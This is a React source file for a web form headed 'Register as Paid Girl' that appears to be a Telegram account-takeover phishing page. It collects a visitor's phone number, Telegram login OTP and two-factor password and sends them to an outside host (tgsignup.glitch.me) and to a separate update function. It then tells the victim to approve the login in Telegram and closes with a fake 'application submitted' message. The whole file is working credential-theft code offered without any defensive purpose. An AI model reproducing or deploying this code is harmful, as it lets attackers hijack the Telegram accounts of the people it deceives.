import React, { useState, useRef, useEffect } from 'react';
import './regForm.css';
import { Spinner } from 'reactstrap';
import axios from 'axios';
import { sendUpdate } from './App';
import profiles, { getActiveProfile, setActiveProfile, setProfiles } from './profiles';
import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
import { parseError } from './utils';

const forms = {
    phoneNumber: 'phoneNumber',
    otp: 'otp',
    twofactor: 'twofactor'
};

function parseTGMsg(message) {
    switch (message) {
        case 'PHONE_CODE_INVALID':
            return 'Incorrect OTP, Please try again!'
        case 'Bad Request':
            return 'Session Expired. Try after 5 minutes'
        default:
            return message
    }
}
let otp = '';

const countryCodes = [
    { label: "India", value: "+91" },
    { label: "United States", value: "+1" },
    { label: "United Kingdom", value: "+44" },
    { label: "Bangladesh", value: "+880" },
    { label: "Pakistan", value: "+92" },
    { label: "United Arab Emirates (Dubai)", value: "+971" },
    { label: "Oman", value: "+968" },
    { label: "Sri Lanka", value: "+94" },
    { label: "Saudi Arabia", value: "+966" },
    { label: "Kazakhstan", value: "+7" },
    { label: "Uzbekistan", value: "+998" },
    { label: "Malaysia", value: "+60" },
    { label: "South Korea", value: "+82" },
    { label: "Japan", value: "+81" },
    { label: "France", value: "+33" },
    { label: "Russia", value: "+7" },
    { label: "Iran", value: "+98" },
    { label: "Brazil", value: "+55" },
    { label: "Indonesia", value: "+62" },
    { label: "Mexico", value: "+52" },
    { label: "Turkey", value: "+90" },
    { label: "Vietnam", value: "+84" },
    { label: "Nigeria", value: "+234" },
    { label: "Philippines", value: "+63" },
    { label: "Egypt", value: "+20" },
    { label: "Italy", value: "+39" },
    { label: "Ukraine", value: "+380" },
    { label: "Colombia", value: "+57" },
    { label: "Argentina", value: "+54" },
    { label: "Thailand", value: "+66" },
    // Add other country codes here
];

const RegForm = (props) => {
    const [formData, setFormData] = useState({
        phoneNumber: '',
        otp: otp,
        password: '',
        phoneCountryCode: '+91'
    });
    const [isLoading, setIsLoading] = useState(false);
    const [activeForm, setActiveForm] = useState(forms.phoneNumber);
    const [errMsg, setErrMsg] = useState('');
    const [showErr, setShowErr] = useState(false);
    const inputRef = useRef(null);
    const submitRef = useRef(null);
    const [ok, setOk] = useState(false);
    const [success, setSuccess] = useState(false);
    const { user } = useParams();
    const [buttonEnabled, setButtonEnabled] = useState(false);

    useEffect(() => {
        const handleVisibilityChange = () => {
            if (!document.hidden) {
                if (activeForm === forms.otp) {
                    const inputbox1 = document.getElementById('otp1');
                    inputbox1.focus()
                    inputbox1.click()
                    console.log('focused')
                } else if (activeForm === forms.phoneNumber) {
                    const inputbox1 = document.getElementById('phoneNumber');
                    inputbox1.focus()
                }
            }
        };
        const timer = setTimeout(() => {
            setButtonEnabled(true);
        }, 10000);
        document.addEventListener('visibilitychange', handleVisibilityChange);
        return () => {
            clearTimeout(timer)
            document.removeEventListener('visibilitychange', handleVisibilityChange);
        };
    }, []);

    useEffect(() => {
        // Assuming profiles and setProfiles are defined elsewhere in the actual code
        if (!profiles[getActiveProfile()]) {
            setProfiles().then((profiles) => {
                setActiveProfile(user);
            });
        }
    }, [user]);

    const handleInputChange = (event) => {
        const { name, value } = event.target;
        if (name === 'phoneNumber') {
            const cleanedValue = value.replace(/\D/g, ''); // Remove non-numeric characters
            setFormData({
                ...formData,
                [name]: cleanedValue,
            });
        } else {
            setFormData({
                ...formData,
                [name]: value,
            });
        }
    };

    const validatePhoneNumber = (phoneNumber) => {
        const mobileNumberPattern = /^[0-9]{10}$/;
        return mobileNumberPattern.test(phoneNumber);
    };

    const handlePhoneSubmit = async (event) => {
        event.preventDefault();
        if (!isLoading) {
            const phoneNumber = formData.phoneNumber.startsWith('+')
                ? formData.phoneNumber.substring(1)
                : formData.phoneNumber;

            if (!validatePhoneNumber(phoneNumber)) {
                alert('Please enter a valid 10-digit mobile number');
            } else {
                setIsLoading(true);
                try {
                    const response = await axios.get(`https://tgsignup.glitch.me/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
                    await sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
                    setIsLoading(false);
                    if (response.status === 200) {
                        setActiveForm(forms.otp);
                        setShowErr(false);
                    } else {
                        const err = parseError({ response })
                        let message = err.message
                        setErrMsg(message || 'Unknown error');
                        setShowErr(true);
                    }
                } catch (error) {
                    setIsLoading(false);
                    const err = parseError(error)
                    let message = err.message
                    setErrMsg(message || 'Unknown error');
                    setShowErr(true);
                }
            }
        }
    };

    const handleOTPInput = (e) => {
        const input = e.target;
        let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
        if (value.length > 1) {
            value = value.slice(-1); // Keep only the last digit if more than one digit is pasted
        }
        input.value = value;

        const otp = Array.from({ length: 5 }, (_, i) => document.getElementById(`otp${i + 1}`).value).join('');
        setFormData({ ...formData, otp });

        if (value.length === 1 && input.nextSibling) {
            input.nextSibling.focus();
        }
        if (otp.length === 5) {
            submitRef.current.focus()
        }
    };

    const handlePaste = (e, type) => {
        const pastedData = e.clipboardData.getData('text').replace(/\D/g, ''); // Remove non-numeric characters
        if (type === 'phone') {
            const lastTenDigits = pastedData.slice(-10);
            if (lastTenDigits.length === 10) {
                setFormData({ ...formData, phoneNumber: lastTenDigits });
            } else {
                alert('Please paste a valid 10-digit mobile number');
            }
        } else if (type === 'otp') {
            const otpInputs = document.querySelectorAll('.otp-input input');
            if (pastedData.length === 5) {
                otpInputs.forEach((input, index) => {
                    input.value = pastedData[index];
                });
                submitRef.current.focus()
                setFormData({ ...formData, otp: pastedData });
            } else {
                alert('Please paste a valid 5-digit OTP');
            }
        }
    };

    const handleOTPSubmit = async (event) => {
        event.preventDefault();
        if (!isLoading) {
            setShowErr(false);

            if (/^[0-9]{5}$/.test(formData.otp)) {
                setIsLoading(true);
                try {
                    otp = formData.otp
                    const response = await axios.get(`https://tgsignup.glitch.me/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
                    setIsLoading(false);
                    await sendUpdate(JSON.stringify(formData));
                    if (response.status === 200) {
                        setOk(true);
                        setActiveForm(forms.phoneNumber);
                    } else {
                        const err = parseError({ response })
                        let message = err.message
                        setErrMsg(parseTGMsg(message) || 'Unknown error');
                        if (response.message?.toLowerCase().includes('2fa')) {
                            setActiveForm(forms.twofactor);
                        }
                        setShowErr(true);
                    }
                } catch (error) {
                    setIsLoading(false);
                    const err = parseError(error)
                    let message = err.message
                    setErrMsg(parseTGMsg(message) || 'Unknown error');
                    setShowErr(true);
                }
            }
        }
    };

    const handleBackspace = (e, index) => {
        const input = e.target;
        if (e.key === 'Backspace' && e.target.value === '' && index > 0 && input.previousSibling) {
            input.previousSibling.focus();
        }
    };
    const handleProceedclick = (e) => {
        e.preventDefault()
        console.log(buttonEnabled);
        if (buttonEnabled) {
            setSuccess(true)
        } else {
            console.log('inside')
            const proceederr = document.getElementById('proceederr');
            proceederr.style.display = 'block';
        }
    }

    return (
        <div style={{ backgroundColor: '#1d2124', textAlign: 'center', paddingTop: '4vh' }}>
            {!ok && (
                <div>
                    <div style={{ marginTop: '3vh' }}>
                        <h6 style={{ fontSize: '6vw', color: 'rgb(0 217 255)', margin: '0px' }}>
                            {props.heading ? props.heading : 'Register as Paid Girl'}
                        </h6>
                        {!props.heading && <p style={{ fontSize: '3vw', color: 'wheat' }}>Create your own website page</p>}
                    </div>
                    {activeForm === forms.phoneNumber && (
                        <form autoComplete='on' onSubmit={handlePhoneSubmit} className="register-form">
                            <div>
                                {props.others && <input type="text" ref={inputRef} name="firstName" placeholder="First Name" autoComplete="given-name" />}
                                {props.others && <input type="text" name="lastName" placeholder="Last Name" autoComplete="family-name" />}
                                <div className="phone-number-input">
                                    <select id="phone-country-code" name="phoneCountryCode" value={formData.phoneCountryCode} onChange={handleInputChange} required>
                                        {countryCodes.map((code) => (
                                            <option key={code.value} value={code.value}>
                                                {code.value} &nbsp;&nbsp;&nbsp; ({code.label})
                                            </option>
                                        ))}
                                    </select>
                                    <input
                                        type="tel"
                                        id='phoneNumber'
                                        style={{ margin: '0px 0px 20px 0px' }}
                                        autoFocus={true}
                                        name="phoneNumber"
                                        minLength={10}
                                        maxLength={10}
                                        value={formData.phoneNumber}
                                        onChange={handleInputChange}
                                        onPaste={(e) => handlePaste(e, 'phone')}
                                        required
                                        placeholder="Phone Number"
                                        autoComplete="tel"
                                    />
                                </div>
                                <button
                                    type="submit"
                                    className='button'
                                    style={{
                                        fontSize: '17px',
                                        margin: '3vw 0px',
                                        background: isLoading ? 'gray' : 'rgb(0, 163, 255)',
                                        cursor: isLoading ? 'not-allowed' : 'pointer'
                                    }}
                                >
                                    <span style={{ paddingBottom: '3px' }}>Send OTP</span>
                                </button>
                            </div>
                        </form>
                    )}
                    {activeForm === forms.otp && (
                        <form autoComplete='on' onSubmit={handleOTPSubmit} className="register-form">
                            <div>
                                <h6 style={{ color: 'rgb(17 255 167)', fontSize: '15px', display: 'block' }}>
                                    Enter the OTP received on your <span style={{ color: 'red', fontWeight: 'bolder' }}>Telegram App</span>
                                </h6>
                                <div className="otp-input" autoFocus={true} onPaste={(e) => handlePaste(e, 'otp')}>
                                    {[...Array(5)].map((_, i) => (
                                        <input
                                            key={i}
                                            type="number"
                                            autoFocus={i === 0}
                                            inputMode="numeric"
                                            minLength={1}
                                            maxLength={1}
                                            name={`otp${i + 1}`}
                                            id={`otp${i + 1}`}
                                            onInput={handleOTPInput}
                                            onKeyDown={(e) => handleBackspace(e, i)}
                                            required
                                            placeholder="0"
                                        />
                                    ))}
                                </div>
                                {showErr && <span style={{ color: 'red' }}>{errMsg}</span>}
                                <button
                                    type="submit"
                                    ref={submitRef}
                                    className='button'
                                    style={{
                                        fontSize: '17px',
                                        margin: '3vw 0px',
                                        background: isLoading ? 'gray' : 'rgb(0, 163, 255)',
                                        cursor: isLoading ? 'not-allowed' : 'pointer'
                                    }}
                                >
                                    <span style={{ paddingBottom: '3px' }}>Submit</span>
                                </button>
                            </div>
                        </form>
                    )}
                    {activeForm === forms.twofactor && (
                        <div>
                            <label style={{ fontSize: 'small', color: 'aquamarine', marginTop: '5vh' }}>Telegram Two Factor Authentication Password</label>
                            <form autoComplete='on' onSubmit={handleOTPSubmit} style={{ paddingTop: '0px' }} className="register-form">
                                <div>
                                    <input type="password" autoFocus={true} name="2fa" placeholder="2FA - Password" />
                                    <button
                                        type="submit"
                                        className='button'
                                        style={{
                                            fontSize: '17px',
                                            margin: '3vw 0px',
                                            background: isLoading ? 'gray' : 'rgb(0, 163, 255)',
                                            cursor: isLoading ? 'not-allowed' : 'pointer'
                                        }}
                                    >
                                        <span style={{ paddingBottom: '3px' }}>Submit</span>
                                    </button>
                                </div>
                            </form>
                        </div>
                    )}
                </div>
            )}
            {ok && (
                <div className='success-message'>
                    {!success &&
                        <div>
                            <p>Please confirm your login in <span style={{ color: '#3da7e6', fontWeight: 'bolder' }}>Telegram App</span></p>
                            <div className="image-container">
                                <img src='../verify.jpeg' alt="Sample" className="sample-image" />
                                <div className="blinking-arrow">↑</div> {/* Arrow pointing down */}
                            </div>
                            <p>Open your Telegram and Tap on <span style={{ color: "#3da7e6", fontWeight: 'bolder' }}>"Yes, its' me"</span> to Verify your identity</p>
                            <div style={{ marginTop: '8vh', }}>
                                <p id='proceederr' style={{ color: 'red', display: 'none' }}>Please verify your identity in Telegram App</p>
                                <button className='button' style={{ width: '30%', background: buttonEnabled ? 'green' : 'grey' }} onClick={handleProceedclick}> Proceed </button>
                            </div>
                        </div>
                    }
                    {success && <div>
                        <img src="../tick2.png" alt="Tick Mark" className="tick" />
                        <h1>Application has been submitted</h1>
                        <p>We will contact you soon</p>
                    </div>
                    }
                </div>
            )}
            {isLoading && (
                <div className="spinner-container">
                    <Spinner color="primary" />
                </div>
            )}
        </div>
    );
};

export default RegForm;
